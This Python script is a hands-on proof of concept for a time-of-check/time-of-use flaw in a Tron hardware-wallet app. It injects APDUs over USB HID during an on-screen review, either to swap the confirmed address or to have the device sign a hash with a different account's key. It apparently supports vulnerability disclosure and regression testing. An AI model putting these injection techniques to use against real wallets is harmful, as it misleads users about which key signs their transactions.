#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Manual, on-hardware proof of concept for the review-context TOCTOU.

Companion to the automated Speculos suite (tests/test_toctou.py). That suite
relies on the emulator's raw APDU socket to interleave commands; a real Ledger
exposes a single USB HID pipe and ledgerblue's `dongle.exchange()` blocks until
you approve on the device, so nothing can be injected mid-review through the
normal API.

This script splits the HID write and read so the review APDU can be left
pending on screen while a second APDU is pushed on the *same* connection. The
firmware keeps servicing APDUs during its UX loop (that is the bug), so the
injected command is processed immediately and its response comes back before
you have approved anything.

It is INTERACTIVE: you must watch the device screen and press keys on it when
prompted. It only proves the vulnerability if the firmware is the vulnerable
baseline; once the dispatcher rejects APDUs while a review is pending, the
injected command returns 0x6985 (or similar) and the script reports SAFE.

Transport: USB HID only (what `getDongle(True)` returns for a physical
device). The TCP / BLE proxies are not supported here because the injection
needs frame-level access to the HID pipe.

Scenarios
---------
  addr    (default, needs no settings)
      Verify-address for account A is on screen; a non-confirming
      GET_PUBLIC_KEY for account B overwrites the shared publicKeyContext.
      Approving returns account B's key/address.

  keysub  (needs "Sign by hash" enabled in the app settings)
      Sign-by-hash review of hash H (account A) is on screen; a
      SIGN_PERSONAL_MESSAGE first-chunk for account B rewrites the shared
      transactionContext.bip32_path. Approving signs H with account B's key.
      NOTE: the injected first-chunk answers synchronously (0x9000), which
      consumes the HID transport's single reply slot, so the post-approval
      signature is dropped and the host receives nothing. Use keysub2 to get a
      receivable signature.

  keysub2 (needs "Sign by hash" enabled in the app settings)
      Like keysub, but injects a *deferred* SIGN_TXN_HASH for account B over
      the same hash H instead of a personal-message first-chunk. Because the
      injected APDU is approval-gated it sends no early reply, so exactly one
      reply stays pending and approval flushes a single signature the host can
      read and verify against B. The review redraws (account B's context), so
      it is less stealthy than keysub but actually returns the substituted
      signature.

Usage
-----
  python3 toctouInterleave.py                       # addr scenario
  python3 toctouInterleave.py --scenario keysub
  python3 toctouInterleave.py --path-a "44'/195'/0'/0/0" \\
                              --path-b "44'/195'/1'/0/0"
"""
import argparse
import hashlib
import sys
import time
import threading

from ledgerblue.comm import getDongle
from ledgerblue.ledgerWrapper import wrapCommandAPDU
from eth_keys import KeyAPI

from base import apduMessage, parse_bip32_path

# APDU instructions (see src/handlers/dispatcher.c)
INS_GET_PUBLIC_KEY = 0x02
INS_SIGN = 0x04
INS_SIGN_TXN_HASH = 0x05
INS_GET_APP_CONFIGURATION = 0x06
INS_SIGN_PERSONAL_MESSAGE = 0x08

# GET_PUBLIC_KEY P1
P1_NON_CONFIRM = 0x00
P1_CONFIRM = 0x01
# SIGN / personal-message P1
P1_FIRST = 0x00
P1_SIGN = 0x10

SW_OK = 0x9000
SW_DENIED = 0x6985
APPROVAL_REPLY_TIMEOUT = 20.0
HID_POLL_INTERVAL = 0.05

HID_CHANNEL = 0x0101
HID_PACKET = 64


class HidInterleaveChannel:
    """Frame-level HID access allowing several APDUs to be in flight.

    ledgerblue's ``HIDDongleHIDAPI.exchange`` writes a command and then blocks
    reading the response. Here ``send`` and ``receive`` are separate, so a
    review APDU (which will not answer until the user approves) can be left
    pending while another APDU is pushed and its reply collected.
    """

    def __init__(self, dongle, debug=False):
        # `getDongle(True)` yields a HIDDongleHIDAPI whose `.device` is the
        # underlying hidapi handle.
        self._hid = getattr(dongle, "device", None)
        self.debug = debug
        self._rx_payload = bytearray()
        self._rx_expected = None
        self._rx_next_seq = 0
        if self._hid is None or not getattr(dongle, "ledger", False):
            raise SystemExit(
                "This PoC requires a USB HID Ledger device. TCP/BLE proxies "
                "(LEDGER_PROXY_*, LEDGER_BLE_*) are not supported.")

    def send(self, apdu):
        if self.debug:
            print("    HID => {}".format(bytes(apdu).hex()))
        wrapped = wrapCommandAPDU(HID_CHANNEL, bytearray(apdu), HID_PACKET)
        offset = 0
        while offset < len(wrapped):
            frame = bytes(wrapped[offset:offset + HID_PACKET])
            # hidapi expects a leading report-id byte (0x00).
            if self._hid.write(b"\x00" + frame) < 0:
                raise IOError("HID write failed")
            offset += HID_PACKET

    def receive(self, timeout=45.0):
        """Reassemble one response, or None if nothing arrives in `timeout`.

        Parses the Ledger HID framing directly so a long response can span
        multiple frames without being discarded mid-reassembly.
        """
        self._hid.set_nonblocking(True)
        deadline = time.time() + timeout
        while True:
            frame = self._hid.read(65)
            if frame:
                frame = bytes(bytearray(frame))
                if self.debug:
                    print("    HID <= {}".format(frame.hex()))
                if len(frame) < 5:
                    continue
                if frame[0:2] != b"\x01\x01" or frame[2] != 0x05:
                    self._rx_payload.clear()
                    self._rx_expected = None
                    self._rx_next_seq = 0
                    continue

                seq = (frame[3] << 8) | frame[4]
                if seq == 0:
                    if len(frame) < 7:
                        continue
                    self._rx_expected = (frame[5] << 8) | frame[6]
                    self._rx_payload = bytearray(frame[7:])
                    self._rx_next_seq = 1
                    if self.debug:
                        print("    RX state: start expected={} payload={}".format(
                            self._rx_expected, len(self._rx_payload)))
                else:
                    if seq != self._rx_next_seq:
                        if self.debug:
                            print("    RX state: seq mismatch got={} expected={} -> reset".format(
                                seq, self._rx_next_seq))
                        self._rx_payload.clear()
                        self._rx_expected = None
                        self._rx_next_seq = 0
                        continue
                    self._rx_payload.extend(frame[5:])
                    self._rx_next_seq += 1
                    if self.debug:
                        print("    RX state: cont seq={} payload={}".format(
                            seq, len(self._rx_payload)))

                if self._rx_expected is None:
                    continue
                if len(self._rx_payload) < self._rx_expected:
                    if self.debug:
                        print("    RX state: waiting payload={}/{}".format(
                            len(self._rx_payload), self._rx_expected))
                    continue

                payload = bytes(self._rx_payload[:self._rx_expected])
                self._rx_payload = bytearray(self._rx_payload[self._rx_expected:])
                self._rx_expected = None
                self._rx_next_seq = 0
                if len(payload) < 2:
                    continue
                status = (payload[-2] << 8) | payload[-1]
                if self.debug:
                    print("    RX state: complete data={} sw=0x{:04x}".format(
                        len(payload) - 2, status))
                return payload[:-2], status
            else:
                time.sleep(HID_POLL_INTERVAL)
            if time.time() >= deadline:
                return None

    def drain(self, quiet=2.5, overall=90.0):
        """Collect every response that arrives, stopping after `quiet` seconds
        of silence (or once `overall` elapses). Order is preserved."""
        collected = []
        end = time.time() + overall
        while time.time() < end:
            response = self.receive(timeout=quiet)
            if response is None:
                break
            collected.append(response)
        return collected


###############################################################################
# APDU builders
###############################################################################
def get_public_key_apdu(path, confirm):
    p1 = P1_CONFIRM if confirm else P1_NON_CONFIRM
    return apduMessage(INS_GET_PUBLIC_KEY, p1, 0x00, parse_bip32_path(path), "")


def sign_txn_hash_apdu(path, digest):
    assert len(digest) == 32
    return apduMessage(INS_SIGN_TXN_HASH, 0x00, 0x00, parse_bip32_path(path),
                       digest.hex())


def personal_message_first_apdu(path, declared_len, chunk):
    """A deliberately-incomplete personal message: announces more bytes than
    are sent, so the handler stores the BIP32 path and returns 0x9000 at once
    without displaying anything."""
    assert len(chunk) < declared_len
    body = declared_len.to_bytes(4, "big").hex() + chunk.hex()
    return apduMessage(INS_SIGN_PERSONAL_MESSAGE, P1_FIRST, 0x00,
                       parse_bip32_path(path), body)


def app_config_apdu():
    """A harmless GET_APP_CONFIGURATION used only to pump the io loop."""
    return apduMessage(INS_GET_APP_CONFIGURATION, 0x00, 0x00, "", "")


def flush_after_approval(channel, max_pumps=3):
    """Force the device to flush a queued async reply.

    Some hardware paths only release the buffered signature on a later APDU
    exchange, so keep issuing a harmless ``GET_APP_CONFIGURATION`` until we see
    a signature or run out of retries. Keep every reply and let the caller
    classify by size/content.
    """
    flushed = []
    for _ in range(max_pumps):
        channel.send(app_config_apdu())
        batch = channel.drain(quiet=3.0)
        if batch:
            flushed.extend(batch)
            if any(status == SW_OK and len(data) >= 65 for data, status in batch):
                break
        else:
            # No reply at all yet; give the device another chance to flush.
            continue
    return flushed


###############################################################################
# Response parsing / helpers
###############################################################################
def parse_get_public_key(data):
    pk_len = data[0]
    public_key = data[1:1 + pk_len]
    addr_len = data[1 + pk_len]
    address = data[2 + pk_len:2 + pk_len + addr_len].decode("ascii")
    return public_key, address


def recover_signer(digest, signature):
    sig = KeyAPI.Signature(signature_bytes=bytes(signature[0:65]))
    return KeyAPI().ecdsa_recover(digest, sig)


def prompt(message):
    input("\n>>> {}\n    Press Enter here once done... ".format(message))


def wait_for_approval_reply(channel, state, timeout=APPROVAL_REPLY_TIMEOUT):
    """Block waiting for the approval reply(s).

    This is called from a background worker so the HID read starts before the
    user approves on-device. On approval the device may emit MORE than one
    frame back-to-back (e.g. a queued injected-APDU ack plus the signature),
    in either order, so keep draining after the first reply instead of
    grabbing just one -- otherwise the signature can be silently dropped.
    """
    try:
        replies = []
        first = channel.receive(timeout=timeout)
        if first is not None:
            replies.append(first)
            replies.extend(channel.drain(quiet=3.0))
        state["replies"] = replies
    except Exception as exc:
        state["error"] = exc


def query_reference_key(dongle, path):
    """Synchronous, plain get-pubkey (no confirmation) for a reference value."""
    data = dongle.exchange(get_public_key_apdu(path, confirm=False))
    return parse_get_public_key(bytes(data))


###############################################################################
# Scenarios
###############################################################################
def show_replies(label, replies):
    if not replies:
        print("  {}: (none)".format(label))
    for data, status in replies:
        print("  {}: SW=0x{:04x}, {} data bytes".format(label, status,
                                                         len(data)))


def run_addr(channel, dongle, path_a, path_b):
    print("== Scenario: address-verification swap ==")
    ref_pk_a, addr_a = query_reference_key(dongle, path_a)
    ref_pk_b, addr_b = query_reference_key(dongle, path_b)
    print("  account A ({}): {}".format(path_a, addr_a))
    print("  account B ({}): {}".format(path_b, addr_b))

    print("\nSending GET_PUBLIC_KEY (confirm) for account A...")
    channel.send(get_public_key_apdu(path_a, confirm=True))
    prompt("Check the device: it should be VERIFYING ACCOUNT A's ADDRESS "
           "({}).\n    Do NOT approve yet.".format(addr_a))

    print("Injecting GET_PUBLIC_KEY (non-confirm) for account B...")
    channel.send(get_public_key_apdu(path_b, confirm=False))
    # The reply may come now (processed during the review) or only after
    # approval (queued); drain both phases and classify by content afterwards.
    pre = channel.drain(quiet=3.0)
    show_replies("pre-approval reply", pre)

    approval_state = {"replies": [], "error": None}
    approval_thread = threading.Thread(
        target=wait_for_approval_reply,
        args=(channel, approval_state),
        daemon=True,
    )
    approval_thread.start()
    prompt("Now APPROVE the address on the device.")
    approval_thread.join(timeout=APPROVAL_REPLY_TIMEOUT + 5.0)
    if approval_thread.is_alive():
        print("\nInconclusive: no approval response was received.")
        return
    if approval_state["error"] is not None:
        raise approval_state["error"]

    post = approval_state["replies"]
    if not post:
        # The confirmed reply is a deferred reply. If the synchronous injection
        # consumed the transport slot it will not flush; pump once to check.
        post = flush_after_approval(channel)
    show_replies("post-approval reply", post)

    # A GET_PUBLIC_KEY response starts with a 1-byte pubkey length, then the
    # key, then a 1-byte address length, then the base58 address. The flush
    # pump returns 4-byte GET_APP_CONFIGURATION replies, so validate the shape
    # before parsing instead of assuming every SW_OK reply is a pubkey.
    def address_of(data):
        try:
            pk_len = data[0]
            if len(data) < 2 + pk_len:
                return None
            addr_len = data[1 + pk_len]
            if len(data) < 2 + pk_len + addr_len:
                return None
            return data[2 + pk_len:2 + pk_len + addr_len].decode("ascii")
        except (IndexError, UnicodeDecodeError):
            return None

    pre_addrs = [a for a in (address_of(d) for d, s in pre if s == SW_OK) if a]
    post_addrs = [a for a in (address_of(d) for d, s in post if s == SW_OK) if a]
    print("\nAddress displayed for approval  : {}".format(addr_a))
    print("Injection (non-confirm) returned: {}".format(
        ", ".join(pre_addrs) or "(none)"))
    print("Confirmed flow returned         : {}".format(
        ", ".join(post_addrs) or "(none)"))

    # The swap is proven ONLY if the CONFIRMED (post-approval) reply returns B.
    # B appearing in the pre-approval injection is just a normal non-confirm
    # query and proves nothing on its own.
    if addr_b in post_addrs and addr_a not in post_addrs:
        print("\n*** VULNERABLE: confirmed A on screen, but the CONFIRMED reply "
              "returned B's address. ***")
    elif addr_a in post_addrs:
        print("\nSAFE: the confirmed reply returned the reviewed address (A).")
    elif not post_addrs:
        print("\nInconclusive on hardware: the confirmed reply never came back "
              "-- the deferred\nconfirmed reply was swallowed by the HID "
              "transport (the synchronous injection\nconsumed the exchange "
              "slot, same as keysub). B was seen only in the pre-approval\n"
              "injection, which a non-confirm query returns regardless, so the "
              "swap is NOT\ndemonstrated here. Use the Speculos test "
              "(test_toctou_address_verification_swap)\nfor the receivable "
              "proof.")
    else:
        print("\nInconclusive: unexpected address(es) returned.")


def run_keysub(channel, dongle, path_a, path_b, inject=True):
    print("== Scenario: signing-key substitution (needs 'Sign by hash') ==")
    if not inject:
        print("   [CONTROL RUN: injection disabled -- this is just a plain "
              "sign-by-hash\n   over the split-HID channel, to check the "
              "channel can carry an\n   approval-gated signature at all.]")
    ref_pk_a, addr_a = query_reference_key(dongle, path_a)
    ref_pk_b, addr_b = query_reference_key(dongle, path_b)
    digest = hashlib.sha256(b"tron toctou hardware poc").digest()
    print("  account A ({}): {}".format(path_a, addr_a))
    print("  account B ({}): {}".format(path_b, addr_b))
    print("  hash under review: {}".format(digest.hex()))

    print("\nSending SIGN_TXN_HASH for account A...")
    channel.send(sign_txn_hash_apdu(path_a, digest))
    prompt("Check the device: it should be reviewing a transaction/hash for "
           "account A.\n    Do NOT approve yet.")

    if inject:
        print("Injecting SIGN_PERSONAL_MESSAGE first-chunk for account B...")
        channel.send(
            personal_message_first_apdu(path_b, declared_len=64,
                                        chunk=b"\xaa" * 8))
    else:
        print("(control) NOT injecting; expecting account A's own signature.")
    # On hardware the injected 0x9000 and the eventual signature may arrive in
    # either order, so don't assume: drain before and after approval and pick
    # out the 65-byte signature by content.
    pre = channel.drain(quiet=3.0)
    show_replies("pre-approval reply", pre)

    approval_state = {"replies": [], "error": None}
    approval_thread = threading.Thread(
        target=wait_for_approval_reply,
        args=(channel, approval_state),
        daemon=True,
    )
    approval_thread.start()
    prompt("Now APPROVE the transaction on the device.")
    approval_thread.join(timeout=APPROVAL_REPLY_TIMEOUT + 5.0)
    if approval_thread.is_alive():
        print("\nInconclusive: no approval response was received.")
        return
    if approval_state["error"] is not None:
        raise approval_state["error"]

    post = approval_state["replies"]
    if not post:
        # The device buffered the approval reply; pump the io loop to flush it.
        post = flush_after_approval(channel)
    show_replies("post-approval reply", post)

    replies = pre + post
    acks = [sw for _, sw in replies if len(_) == 0]
    if acks and all(sw != SW_OK for sw in acks):
        print("\nSAFE-looking: the injected APDU was refused "
              "(SW=0x{:04x}).".format(acks[0]))

    signatures = [data for data, sw in replies if sw == SW_OK and len(data) >= 65]
    if not signatures:
        print("\nInconclusive: no signature was returned. Is 'Sign by hash' "
              "enabled, and did you approve on the device?")
        return

    signer = recover_signer(digest, signatures[0])
    signer_pk = signer.to_bytes().hex()
    print("\nExpected signer (reviewed A) : {}".format(ref_pk_a.hex()[2:]))
    print("Substituted signer (B)       : {}".format(ref_pk_b.hex()[2:]))
    print("Actual signer of the hash    : {}".format(signer_pk))
    if signer_pk == ref_pk_b.hex()[2:]:
        print("\n*** VULNERABLE: reviewed A's hash, signed with B's key. ***")
    elif signer_pk == ref_pk_a.hex()[2:]:
        print("\nSAFE: the hash was signed with the reviewed key.")
    else:
        print("\nInconclusive: unexpected signer.")


def run_keysub2(channel, dongle, path_a, path_b):
    """Signing-key substitution via a *deferred* injection.

    Unlike ``keysub`` (which injects a SIGN_PERSONAL_MESSAGE first-chunk that
    answers synchronously with 0x9000), this variant injects a second
    SIGN_TXN_HASH for account B over the *same* hash H. That APDU is
    approval-gated too, so it returns no immediate reply: it only overwrites the
    shared ``transactionContext`` (bip32_path -> B) and restarts the review.

    Why this matters: the HID transport carries a single outstanding exchange.
    The synchronous 0x9000 in ``keysub`` consumes that slot, so the eventual
    signature has no exchange to attach to and is dropped (host sees nothing).
    Here neither injected nor original APDU answers early, exactly one reply is
    pending, and approval flushes exactly one signature -- which the host
    receives and can verify against B.

    Tradeoff: injecting SIGN_TXN_HASH re-runs ``ux_flow_display``, so the review
    redraws (account B's context). It is less stealthy than the no-redraw
    personal-message trick, but it yields a receivable, verifiable signature.
    """
    print("== Scenario: signing-key substitution via deferred SIGN_TXN_HASH ==")
    print("   [Injects a second sign-by-hash (path B, same hash H). The review "
          "redraws;\n   approval then flushes a single signature the host can "
          "read and verify.]")
    ref_pk_a, addr_a = query_reference_key(dongle, path_a)
    ref_pk_b, addr_b = query_reference_key(dongle, path_b)
    digest = hashlib.sha256(b"tron toctou hardware poc").digest()
    print("  account A ({}): {}".format(path_a, addr_a))
    print("  account B ({}): {}".format(path_b, addr_b))
    print("  hash under review: {}".format(digest.hex()))

    print("\nSending SIGN_TXN_HASH for account A...")
    channel.send(sign_txn_hash_apdu(path_a, digest))
    prompt("Check the device: it should be reviewing a transaction/hash for "
           "account A.\n    Do NOT approve yet.")

    print("Injecting SIGN_TXN_HASH for account B (same hash H)...")
    channel.send(sign_txn_hash_apdu(path_b, digest))
    # The injected APDU is approval-gated: it sends no immediate reply, it only
    # overwrites transactionContext and restarts the review. So, unlike keysub,
    # we do NOT expect a pre-approval 0x9000 here.
    pre = channel.drain(quiet=3.0)
    show_replies("pre-approval reply", pre)
    if pre:
        print("  (note: unexpected pre-approval reply; the injected "
              "SIGN_TXN_HASH normally defers)")

    approval_state = {"replies": [], "error": None}
    approval_thread = threading.Thread(
        target=wait_for_approval_reply,
        args=(channel, approval_state),
        daemon=True,
    )
    approval_thread.start()
    prompt("The review now shows account B's context. APPROVE it on the "
           "device.")
    approval_thread.join(timeout=APPROVAL_REPLY_TIMEOUT + 5.0)
    if approval_thread.is_alive():
        print("\nInconclusive: no approval response was received.")
        return
    if approval_state["error"] is not None:
        raise approval_state["error"]

    post = approval_state["replies"]
    if not post:
        # The device buffered the approval reply; pump the io loop to flush it.
        post = flush_after_approval(channel)
    show_replies("post-approval reply", post)

    replies = pre + post
    signatures = [data for data, sw in replies if sw == SW_OK and len(data) >= 65]
    if not signatures:
        print("\nInconclusive: no signature was returned. Is 'Sign by hash' "
              "enabled, and did you approve on the device?")
        return

    signer = recover_signer(digest, signatures[0])
    signer_pk = signer.to_bytes().hex()
    print("\nReviewed (originally A)  : {}".format(ref_pk_a.hex()[2:]))
    print("Substituted signer (B)   : {}".format(ref_pk_b.hex()[2:]))
    print("Actual signer of the hash: {}".format(signer_pk))
    if signer_pk == ref_pk_b.hex()[2:]:
        print("\n*** VULNERABLE: reviewed A's hash, signed with B's key. ***")
    elif signer_pk == ref_pk_a.hex()[2:]:
        print("\nSAFE: the hash was signed with the reviewed key.")
    else:
        print("\nInconclusive: unexpected signer.")


SCENARIOS = {"addr": run_addr, "keysub": run_keysub, "keysub2": run_keysub2}


def main():
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--scenario", choices=sorted(SCENARIOS), default="addr")
    parser.add_argument("--path-a", default="44'/195'/0'/0/0",
                        help="reviewed account (default 44'/195'/0'/0/0)")
    parser.add_argument("--path-b", default="44'/195'/1'/0/0",
                        help="injected account (default 44'/195'/1'/0/0)")
    parser.add_argument("--debug", action="store_true",
                        help="log every raw HID frame sent and received")
    parser.add_argument("--no-inject", action="store_true",
                        help="keysub CONTROL run: skip the injected APDU, just "
                             "do a plain sign-by-hash over the split-HID "
                             "channel to confirm it can carry an approval-gated "
                             "signature at all")
    args = parser.parse_args()

    print("-= Tron Ledger =- TOCTOU interleave PoC (HARDWARE, interactive)")
    print("Make sure the Tron app is open and the device is unlocked.\n")

    dongle = getDongle(args.debug)
    try:
        channel = HidInterleaveChannel(dongle, debug=args.debug)
        if args.scenario == "keysub":
            run_keysub(channel, dongle, args.path_a, args.path_b,
                       inject=not args.no_inject)
        else:
            SCENARIOS[args.scenario](channel, dongle, args.path_a, args.path_b)
    finally:
        dongle.close()


if __name__ == "__main__":
    sys.exit(main())
